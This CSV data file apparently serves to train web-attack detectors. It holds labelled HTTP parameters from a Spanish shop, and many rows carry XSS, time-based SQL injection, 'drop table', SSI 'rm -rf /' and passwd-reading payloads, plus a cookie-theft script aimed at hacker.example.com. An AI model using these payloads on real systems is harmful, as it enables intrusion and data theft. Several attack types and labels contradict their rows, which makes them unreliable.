payload,attack_type,label
modo=registro&login=zureik&password=concurrente&nombre=Lino&apellidos=Barea+Runke&email=schulz%40hiperbarcelona.hn&dni=64105812Mparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&direccion=Camoe%2C+189%2C+&ciudad=Olv%E9s&cp=03579&provincia=Guip%FAzcoa&ntc=6282081679981232&B1=Registrar123,xss,1
id=2&nombre=Vino+Rioja&precio=85&cantidad=57&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=9600&B1=Pasar+por+caja,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=banerjee&pwd=i1ic-%EDneo%7C&remember=on&B1=Entrar,cmdi,1
modo=insertar&precio=2860&B1=Confirmar%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
b2=vaciar+carrito%3f,normal,1
modo=registro&login=lantz&password=5r32n7&nombre=medey&apellidos=rabascall&email=struchkova%40gestionsoftware.cl&dni=82160553e&direccion=c%2f+gallarza%2c+147+&ciudad=cantalejo&cp=43376&provincia=lleida&ntc=6657407608418544&b1=registrar,normal,0
id=1,normal,0
B2=Vaciar+carrito,normal,0
id=1,normal,0
modo=registro&login=wendy&password=a-h%EDlo&nombre=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&apellidos=Alba%F1il+Comasoli&email=raidhi_altermen%40prestamosypersonales.kw&dni=68675744K&direccion=Puerto+De+Canfranc+179%2C+&ciudad=Mont%F3n&cp=12415&provincia=Guadalajara&ntc=8960280484576559&B1=Registrar123,xss,1
B2=Vaciar+carrito,normal,0
modo=registro&login=ulric&password=b9s37ac1&nombre=Rom%E1n&apellidos=Monta%F1a+Baltan%E1s&email=unwin%40hacia.gr&dni=95417371P&direccion=C%2F+Rio+Cea%2C+77%2C+&ciudad=Muduex&cp=17534&provincia=Valencia&ntc=7380832792617774&B1=Registrar,normal,0
errorMsgA=Credenciales+incorrectas123,normal,1
modo=entrar&login=chandras&pwd=h%2Bolgona&remember=on&B1A=Entrar,cmdi,1
id=1&nombre=Vino+Riojaany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=100&cantidad=53&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=peers&password=at222a1&nombre=Cipriana&apellidos=Serradell&emailA=cornthwaite%40clichotel.do&dni=19247264J&direccion=C%2F+Joventut%2C+182%2C+&ciudad=Alegia&cp=31510&provincia=Salamanca&ntc=8765134980053757&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=scanlan&password=2n5fe2ta2a&nombre=Rasmira&apellidos=Pavi%E9+Pool&email=gloves%40sms24h.mk&dni=92795576Y&direccion=C%2F+Venus%2C%2B+60%2C+&ciudad=Ger&cp=24370&provincia=Cantabria&ntc=7563981891605435&B1=Registrar,cmdi,1
id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=63&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=ichizen&password=liMaco&nombre=Salom%E9&apellidos=Slaibe+Hipolit&email=ekezian-wohlfeiler%40cirugiaalbeiteria.lv&dni=86168713H&direccion=C%2F+L%27+Or%2C+125+&ciudad=Benifl%E1&cp=23710&provincia=Burgos&ntc=4844031303966042&B1=Registrar123,normal,0
modo=insertar&precio=2613&B1=Confirmar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&loginA=roig&pwd=verecunda&remember=on&B1=Entrar,cmdi,1
B2=Vaciar+carrito%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=entrar&login=caryn&pwd=oliv_icultora&remember=on&B1=Entrar123,normal,0
modo=insertarAND+1%3D1&precio=252&B1=Confirmar,cmdi,1
modo=entrar&login=audrye&pwd=ech5d7&remember=off&B1=Entrar,normal,0
modo=insertar&precio=326&B1=Pasar+por+caja123,normal,0
modo=insertar&precio=5756&b1=pasar+por+caja,normal,0
modo=insertar&precio=400&B1=Pasar+por+caja%2F,cmdi,1
B2=Vaciar+carrito123,normal,0
id=2&nombre=Vino+Rioja&precio=100&cantidad=78&B1=A%F1adir+al+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=insertar&precio=8496&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E123,sqli,1
modo=registro&login=retallac&password=gurupera&nombre=roger&apellidos=puppato+marnetti&email=nilda%40nightflight.ec&dni=09185484c&direccion=plza.+mariano+arregui+canela+171%2c+&ciudad=b%e1rcena+de+pie+de+concha&cp=22200&provincia=zamora&ntc=8331341352065092&b1=registrar,normal,0
B2A=Vaciar+carrito123,normal,1
modo=registro&login=bat&password=escuda4&nombre=Casia&apellidos=Alert+Farreron&email=olarova%40ssextremadura.bg&dni=13843179P&direccion=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&ciudad=Oia&cp=04531&provincia=Huelva&ntc=2507926371320953&B1=Registrar,xss,1
id=1&nombre=Queso+Manchego&precio=100&cantidad=79&B1=A%F1adir+al+carrito,normal,0
modo=entrar&login=walt0&pwd=e2cr1t0c0&rememberA=off&B1=Entrar,cmdi,1
B2=Vaciar+carrito,normal,0
modo=registro&login=angelle&password=FeBrIdo&nombre=Mairena&apellidos=Guinaldo+Guals&email=trooger_gereighty%40quierocortinas.mil&dni=23522946H&direccion=Urbanizacion+Barrio+Ledesma%2C+180%2C+&ciudad=Navalvillar+de+Ibor&cp=34468&provincia=Palencia&ntc=6619530004165015&B1=Registrar123,normal,0
id=2paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2,xss,1
id=1&nombre=Vino+Rioja&precio=39&cantidad=60&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=tania&password=aritm%E9tica&nombre=Nahir&apellidos=Lamo+Gelber&email=sherlock%40freecreditcheck.ec&dni=00776957V&direccion=C%2F+Antonio+Machado%2C+1+&ciudad=Pe%F1aranda+de+Bracamonte&cp=19112&provincia=%C1vila&ntc=378274661282900A&B1=Registrar,cmdi,1
MODO=INSERTAR&PRECIO=3796%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e&b1=pASAR+POR+CAJA,xss,1
modo=registro&login=thomasia&password=cautela&nombre=Jovita&apellidos=Raja+Villalba&email=nineteen%40drivinn.int&dni=62128531B&direccion=Del+Nuevo+Mundo+S%2FN+&ciudad=Paracuellos&cp=09247&provincia=Guadalajara&ntc=0828132663978169&B1=Registrar,normal,0
id=2,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=1633&B1=Confirmar%2F,cmdi,1
modo=insertar&precio=898&B1=Confirmar%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
MODO=ENTRAR&LOGIN=GAVENS0&PWD=%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e&REMEMBER=ON&b1=eNTRAR,sqli,1
b2a=vaciar+carrito,normal,1
id=any%253f%250d%250aset-cookie%253a%2btamper%253d1041264011025374727%250d%250a,normal,1
errorMsgA=Credenciales+incorrectas,normal,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=30&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=subraman&password=rectificadora&nombre=Nehem%EDas&apellidos=Rogers&email=law%40ankawaelda.au&dni=541910A8Y&direccion=o+Riomao+36%2C+8%3FF&ciudad=Villar+de+Peralonso&cp=13429&provincia=M%E1laga&ntc=5016740108170299&B1=Registrar,cmdi,1
modo=registro&login=wilie&password=v9n939z6&nombre=Gina&apellidos=Subir%F3s+Figaredo&email=urchins%40waikilu.mg&dni=93698052P&direccion=Gredos%2C+114+12%3FG&ciudad=Castroverde&cp=05520&provincia=Burgos&ntc=7277765230207053&B1=Registrar,normal,0
errormsg=credenciales+incorrectas,normal,0
b2=vaciar+carrito%27or%27a%3d%27a,normal,1
id=1&nombre=Vino+Rioja&precio=39&cantidad=7&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=1875&B1=Confirmar123,normal,0
modo=insertar&precio=4580any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Pasar+por+caja,cmdi,1
ID=PAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29,xss,1
modo=registro&login=lieneman&password=carteado&nombre=Valimir&apellidos=Escat+Monistca&email=kelsey%40helicopter.com.kh&dni=38626822R&direccion=Carlos+Trivi%F1o+Moreno%2C+2%2C+&ciudad=Quintela+de+Leirado&cp=15318&provincia=Valladolid&ntc=6182859902637153&B1=Registrar123,normal,0
modo=insertar&precio=88&B1=Pasar+por+caja,normal,0
modo=entrar&login=willetta&pwd=serr%E1til&remember=off&B1=Entrar,normal,0
modo=insertar%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&precio=5191&B1=Confirmar123,sqli,1
B2A=Vaciar+carrito,normal,1
id=+,normal,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=genvieve&password=creyente&nombre=Yoel&apellidos=Meli%E0+Portugal&email=nicholls%40devuelos.vu&dni=70825753J&direccion=Travesia+Brieva%2C+171%2C+&ciudad=Boqui%F1eni&cp=07310&provincia=Girona&ntc=5693419988123325&B1=Registrar,normal,0
idA=3&nombre=Vino+Rioja&precio=85&cantidad=21&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=hartford&pwd=v5llo34&remember=on&b1=entrar,normal,0
modoA=insertar&precio=9043&B1=Pasar+por+caja,cmdi,1
id=1123,normal,0
modo=registro&login=nordskog&password=c0nno7a6a914&nombre=Irineo&apellidos=Benedetti+Lozana&email=dunyapan.smaney6%40multasdetrans%40ito.gh&dni=16540072J&direccion=Calle+Sancho+32+&ciudad=Guadassuar&cp=05644&provincia=C%F3rdoba&ntc=4808153993761167&B1=Registrar,cmdi,1
modo=registro&login=avilez&password=TaPaCAMiNO&nombre=Nuncio&apellidos=Labayen+Matons&email=allwin%40la-sexta-f1.eg&dni=85324073F&direccion=C%2F+Del+Comer%E7%2C+126%2C+4%3FD&ciudad=Osor&cp=42328&provincia=Cuenca&ntc=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Registrar,xss,1
b2a=vaciar+carrito,normal,1
B2=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29123,xss,1
modo=insertar&precio=2794&B1A=Confirmar,cmdi,1
id=2%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&nombre=Queso+Manchego&precio=85&cantidad=9&B1=A%F1adir+al+carrito123,xss,1
modo=registro&login=poliwoda&password=enigmatista&nombre=Tarciano&apellidos=%252B&email=nardo%40codwatw.lk&dni=08762650H&direccion=Federico+Landrove+Moi%F1o+105+3-G&ciudad=Goizueta&cp=19360&provincia=Alicante&ntc=7171983347621063&B1=Registrar,cmdi,1
id=1&nombreA=Jam%F3n+Ib%E9rico&precio=85&cantidad=73&B1=A%F1adir+al+carrito,cmdi,1
id=1,normal,0
modo=registro&login=aubine&password=T1656%F14L&nombre=Silas&apellidos=Carbot+Llanos&email=etienne-wray%40juegois.je&dni=05248300E&direccion=Calle+Darsena+San+Magin+198%2C+&ciudad=Tramaced&cp=38820&provincia=Huelva&ntc=8990907975781927&B1=Registrar,normal,0
id=3&nombre=queso+manchego&precio=39&cantidad=43&b1=a%f1adir+al+carrito,normal,0
MODO=ENTRAR&LOGIN=SATTA&PWD=ES699601R&REMEMBER=ON%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e&b1=eNTRAR,sqli,1
idA=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=24&B1=A%F1adir+al+carrito,cmdi,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=68&B1=A%F1adir+al+carrito,normal,0
B2=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=entrar&login=tawnya3&pwd=0esh6red32&remember=off&B1=Entrar,normal,0
b2=vACIAR+CARRITO%3c%21--%23INCLUDE+FILE%3d%22ARCHIVO_SECRETO%22+--%3e,sqli,1
id=2&nombre=Queso+Manchego&precio=100&cantidadA=34&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=3069&B1A=Confirmar,cmdi,1
modo=insertar&precio=6225&B1=Confirmar,normal,0
idA=2,normal,1
modo=insertar&precio=4005&B1=Confirmar,normal,0
modo=insertar&precioA=5627&B1=Pasar+por+caja,cmdi,1
errorMsg=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E123,xss,1
modo=registro&login=georgian&password=qwerty&nombre=Silvio&apellidos=Zempoalteca+Fuxet&email=pannequin%40repretexbcn.gl&dni=02314635F&direccion=o+Casal+135%2C+4%3FA&ciudad=Valdelosa&cp=29109&provincia=Soria&ntc=4797639945557963&B1=Registrar,normal,0
modo=entrar%27+AND+%271%27%3D%271&login=ranbir&pwd=sal%EDfero&remember=off&B1=Entrar,cmdi,1
modo=registro&login=houston&password=8n885rado&nombre=Salvino&apellidos=Ivanco+Casola&email=galli_amagula%40hotelesjerez.lc&dni=53532197L&direccion=Calle+Memorias%2C+21%2C+sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&ciudad=Artesa+de+Segre&cp=05571&provincia=Burgos&ntc=3983408909914725&B1=Registrar,cmdi,1
modo=registro&login=eoin&password=H8bEr&nombre=Robertino&apellidos=Sintes+Novoa&email=rix.piljeckaja%40waterflyesp.be&dni=24604865V&direccion=C%2F+Barri+Del+Polvori%2C+77+&ciudad=Aldehuela+de+Yeltes&cp=05365&provincia=Guadalajara&ntc=9228046254742614&B1=Registrar,normal,0
modo=entrar&login=ficker&pwd=SoSa%F1O&remember=on&B1=Entrar,normal,0
modo=registro&login=calley&password=posTIfijO&nombre=Naiara&apellidos=Baldo+Urra&email=wildhagen_cavender%40hotelestopsecret.kp&dni=91334515C&direccion=%2520&ciudad=Jaul%EDn&cp=04280&provincia=%C1vila&ntc=4540479003454435&B1=Registrar,cmdi,1
modo=entrar&login=waring&pwd=445uG4&remember=on&B1=Entrar,normal,0
modo=insertar&precio=8032&b1=pasar+por+caja,normal,0
modo=entrar&login=hauersto%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=angeL%F3n&remember=on&B1=Entrar123,sqli,1
id=1&nombre=Vino+Rioja&precio=100&cantidad=%252B&B1=A%F1adir+al+carrito,cmdi,1
idA=1,normal,1
modo=entrar&login=%7C&pwd=cAPRIFOli%C1CeA&remember=on&B1=Entrar,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=peiser&password=9iri7aza&nombre=Nevel&apellidos=Domenge+Canelas&email=kirland-lincovsky%40la-sexta-f1.fo&dni=48549953N&direccion=Rio+Jarama+194+6-H&ciudad=Valverdejo&cp=20150&provincia=Toledo&ntc=9766800722499068&B1=Registrar,normal,0
id=1&nombre=Vino+Rioja&precio=100&cantidad=8&B1=A%F1adir+al+carrito,normal,0
b2=vaciar+carrito,normal,0
modo=insertar&precio=6264&B1=Confirmar,normal,0
modo=entrar&login=roque&pwd=pulir&rememberA=off&B1=Entrar,cmdi,1
id=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,normal,1
modoA=insertar&precio=1761&B1=Confirmar,cmdi,1
B2=Vaciar+carrito,normal,0
modo=insertar&precio=8912&B1=Pasar+por+caja,normal,0
MODO=INSERTARBOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG&PRECIO=1746&b1=pASAR+POR+CAJA,xss,1
errorMsg=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,normal,1
errorMsg=Credenciales+incorrectas,normal,0
MODO=REGISTRO&LOGIN=OFCPARMS&PASSWORD=MUTABiLIDAD&NOMBRE=pETRONIO&APELLIDOS=pEDROL&EMAIL=CADORET%40ESCUELAMONTESSORI.PA&DNI=17229359j&DIRECCION=hERMANAS+sANCHEZ+tAMARGO%2c+56+&CIUDAD=mORERUELA+DE+LOS+iNFANZONES&CP=%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PROVINCIA=hUELVA&NTC=9991778846189173&b1=rEGISTRAR,sqli,1
B2=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E,xss,1
modo=insertar&precio=3765&b1=pasar+por+caja,normal,0
B2=Vaciar+carritosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,normal,1
B2=Vaciar+carrito,normal,0
B2=Vaciar+carrito,normal,0
modo=entrar&login=thomaier&pwd=re98329e&remember=off&B1=Entrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=insertar&precio=3845&B1=Pasar+por+caja%2F,cmdi,1
modo=registro&login=cannatar&password=7i78o02&nombreA=Sofanor&apellidos=Cortadel+Montori&email=mckechnie%40beatrizbalado.sh&dni=50674086A&direccion=Calle+Los+Vidrieros%2C+93%2C+4-D&ciudad=Regueras%2C+Las&cp=24221&provincia=Sevilla&ntc=2207393266096616&B1=Registrar,cmdi,1
id=2&nombre=queso+manchego&precio=100&cantidad=94&b1=a%f1adir+al+carrito,normal,0
b2a=vaciar+carrito,normal,1
modo=registro&login=leni&password=enGOLfar&nombre=Balulde&apellidos=Siles+Pinyol&email=panov%40ballerpoker.sh&dni=10560589R&direccion=Calle+Monte+Miramar%2C+S%2FN+&ciudad=Fogars+de+la+Selva&cp=11693&provincia=Tarragona&ntc=0222583632895914&B1=Registrar,normal,0
B2=Vaciar+carrito,normal,0
B2=Vaciar+carritoany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727123,normal,1
modo=entrar&login=fuzong&pwd=comodida%3Fd&rememberA=on&B1=Entrar,cmdi,1
modo=insertar+&precio=4296&B1=Confirmar,cmdi,1
id=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=entrar&login=ruqiang&pwd=ocelot&remember=on&B1=Entrar,normal,0
modo=registro&login=rici&password=aguiscar&nombre=C%E1stulo&apellidos=Errante+Bov%E9&email=porokhovschikov%40placeresadultos.st&dni=50383140F&direccion=Calle+De+San+Lorenzo+88%2C+4%3FE&ciudad=Bocairent&cp=32780&provincia=C%E1ceres&ntc=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=Registrar123,xss,1
modoA=entrar&login=mcready&pwd=%2Bad7quie7&remember=on&B1=Entrar,cmdi,1
modo=entrar&login=rouer9&pwd=g0r2o94&remember=off%2F&B1=Entrar,cmdi,1
modo=insertar&precio=2925&b1=pasar+por+caja,normal,0
ID=%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
id=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=registro+&login=knudsen&password=2u6sidi7&nombre=Arist%F3cles&apellidos=Figueras+Boado&email=dreese_teter0%40promotorareina.sg&dni=46079208L&direccion=Carrer+Ildefons+Cerda+160+&ciudad=Regueras%2C+Las&cp=40152&provincia=Navarra&ntc=2561301894117628&B1=Registrar,cmdi,1
modo=registro&login=dyck&password=acre&nombre=Teodota&apellidos=Pereda+Barrio&email=barrymore%40hipermadrid.pe&dni=52137467D&direccion=Doctor+Waksmann%2C+120%2C+7%3FB&ciudad=Caudete&cp=31282&provincia=Barcelona&ntc=3161746053397457&B1=Registrar,normal,0
modo=entrar&login=oyama&pwd=chiapa&remember=on&B1=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,xss,1
B2A=Vaciar+carrito,normal,1
id=3&nombre=Vino+Rioja&precio=85&cantidad=38&B1=%3F,cmdi,1
modo=registro&login=bobbette&password=v4N0c76.SE&nombre=Albere&apellidos=Guri+Oll%E9s&email=mallalieu%40soymuyguapa.ml&dni=58990935Y&direccion=Pla%E7a+Puerto+Rico%2C+144+&ciudad=Guadalajara&cp=21320&provincia=Soria&ntc=0626053300449217&B1=Registrarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,cmdi,1
modo=registro&login=tosca&password=co2posi9or&nombre=remberta&apellidos=lombard%eda+otago&email=kerjean%40global-services.be&dni=73361115q&direccion=pasaje+cruz+de+mayo+108+1%3fc&ciudad=barruecopardo&cp=47882&provincia=alicante&ntc=8466112924954826&b1=registrar,normal,0
errorMsg=Credenciales+incorrectasbob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,xss,1
errorMsgA=Credenciales+incorrectas,normal,1
MODO=REGISTRO&LOGIN=%27%3b+drop+table+USUARIOS%3b+select+*+from+DATOS+where+NOMBRE+like+%27%25&PASSWORD=SEGUNDAR&NOMBRE=aRMELIO&APELLIDOS=gOCHEZ&EMAIL=SHANKLEY%40DISCON.SZ&DNI=25054750e&DIRECCION=c%2f+fUENTE+dEL+rEY%2c+s%2fn%2c+&CIUDAD=gAVILANES&CP=36110&PROVINCIA=sALAMANCA&NTC=2607422784974121&b1=rEGISTRAR,sqli,1
modo=registro&login=breanne&password=galce&nombre=Medey&apellidos=Adam+Calao&email=koock%40aridossanchez.mt&dni=78590398L&direccion=C%2F+Virgen+De+Bego%F1a+43+&ciudad=Pontenova%2C+A&cp=26292&provincia=Burgos&ntc=3428501234979373&B1=Registrar123,normal,0
id=2&nombre=Ques%2Bo+Manchego&precio=100&cantidad=69&B1=A%F1adir+al+carrito,cmdi,1
B2=Vaciar+carrito,normal,0
MODO=REGISTRO&LOGIN=QUAN&PASSWORD=l71O7o6%cdnE4&NOMBRE=hERM%e1NN&APELLIDOS=eSTARAGU%e9+cORT%e9S&EMAIL=GIRLS%40VISCOTEK.MH&DNI=62336583m&DIRECCION=PAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29&CIUDAD=aRAS&CP=37727&PROVINCIA=gRANADA&NTC=3043074301340407&b1=rEGISTRAR,xss,1
modo=insertar&precio=2533&B1=Pasar+por+caja,normal,0
id=1&nombre=Vino+Rioja&precio=100&cantidad=9&B1=A%F1adir+al+carrito,normal,0
B2=Vaciar+carrito,normal,0
modo=entrar&login=tres-sup&pwd=8%2Cif%EDc6l&remember=on&B1=Entrar,cmdi,1
modo=%7C&login=donak&pwd=9rupa&remember=on&B1=Entrar,cmdi,1
B2A=Vaciar+carrito,normal,1
modo=registro&login=seymour5&password=014e35&nombre=Arroldo&apellidos=Kagioglu+Almendro&email=vildo%40prensahp.fj&dni=46225556H&direccion=Pla%E7a+Font%2C+179+&ciudad=Caminreal&cp=19223&provincia=Huesca&ntc=1901048287713824&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
modo=registro&login=althea4&password=iNFIdA&nombre=Tersilio&apellidos=Albareda+Castelltort&email=koczian%40decoaching.is&dni=62776679L&direccion=C%2F+Forjadores%2C+131+&ciudad=Solana+de+los+Barros&cp=24248&provincia=Toledo&ntc=1356891564948898&B1=Registrar,normal,0
modo=entrar&login=ayse&pwd=quillotrar&remember=on%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=Entrar123,xss,1
id=2&nombre=jam%f3n+ib%e9rico&precio=39&cantidad=64&b1=a%f1adir+al+carrito,normal,0
B2=Vaciar+carrito,normal,0
errormsga=credenciales+incorrectas,normal,1
modo=registro&login=liping%4040&password=paletada&nombre=Laura&apellidos=Esparraguera&email=palk%40interpretacion-diccionario-y-significado-de-los-sue%F1os.com.&dni=31539666L&direccion=Calle+Gonzalo+De+Berceo+76%2C+&ciudad=Rioseco+de+Soria&cp=16890&provincia=Salamanca&ntc=5041701632668504&B1=Registrar,cmdi,1
modo=insertar&precio=2860&B1=Confirmar%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=insertar&precio=1227&B1=Confirmar%2F,cmdi,1
errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS,normal,1
id=2bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org123,xss,1
id=2&nombre=Queso+Manchego&precio=100&cantidad=63&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=loraine&password=r09p8tuo49m%2Ben2e&nombre=Nader&apellidos=Carameso+Yabar&email=kristiansen-fineschi%40bijoubijoudiferente.cl&dni=91800426C&direccion=Patio+Poeta+Luis+Rosales%2C+50+8F&ciudad=Presencio&cp=26291&provincia=Zaragoza&ntc=6467099706129021&B1=Registrar,normal,0
modo=insertar&precio=3796&B1=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org123,xss,1
ID=3&NOMBRE=jAM%f3N+iB%e9RICO&PRECIO=100&CANTIDAD=74&b1=a%f1ADIR+AL+CARRITO%27%3b+drop+table+USUARIOS%3b+select+*+from+DATOS+where+NOMBRE+like+%27%25,sqli,1
id=2,normal,0
errorMsg=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E,xss,1
idA=2,normal,1
modo=registro&login=trung&password=ASshOlE&nombre=Adri%E1n&apellidos=Castell%F3+Sargatal&email=robelo%40moviels.me&dni=37576555Y&direccion=Carrer+Mestre+Albages+61%2C+&ciudad=Benal%FAa+de+las+Villas&cp=09869&provincia=Salamanca&ntc=0452635229820629&B1=Registrar,normal,0
modo=registro&login=helen-el&password=carr3e0&nombre=gloriano&apellidos=palmer+manzano&email=asander1%40nutrimama.do&dni=27236120a&direccion=calle+juana+ibarborou+134%2c+&ciudad=nava+de+roa&cp=33775&provincia=teruel&ntc=8355091548756460&b1=registrar,normal,0
